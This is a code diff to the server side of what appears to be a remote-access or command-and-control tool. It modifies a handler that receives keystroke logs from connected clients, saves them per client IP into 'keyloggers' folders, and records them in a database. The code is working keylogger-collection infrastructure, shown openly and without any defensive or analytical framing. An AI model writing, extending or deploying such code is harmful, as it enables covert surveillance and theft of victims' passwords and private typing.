@@ -330,14 +330,19 @@ def handle_keyboard(data):
     if client:
         keylogger_dir = f"keyloggers/{client.ip}"
         os.makedirs(keylogger_dir, exist_ok=True)
-        file_name = f"{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
+        file_name = f"{datetime.now().strftime('%Y-%m-%d_%H')}.txt"
         keylogger_path = f"{keylogger_dir}/{file_name}"
         with open(keylogger_path, 'w', encoding='utf-8') as f:
-            for key in data:
-                f.write(f"{key[0]} - {key[1]} - {key[2]}\n")
+            for key in data.get('keyboard_log'):
+                f.write(f"{key[0]} - {key[1]}\n")
         new_command = Command(type=CommandType.KEYLOGGER, client_id=client.id, file_path=keylogger_path)
-        db.session.add(new_command)
-        db.session.commit()
+        if db.session.query(Command).filter_by(file_path=keylogger_path).count() > 0:
+            update_command = Command.query.filter_by(file_path=keylogger_path).first()
+            update_command.date_created = datetime.now()
+            db.session.commit()
+        else:
+            db.session.add(new_command)
+            db.session.commit()
 
 
 @socketio.on('disconnect')
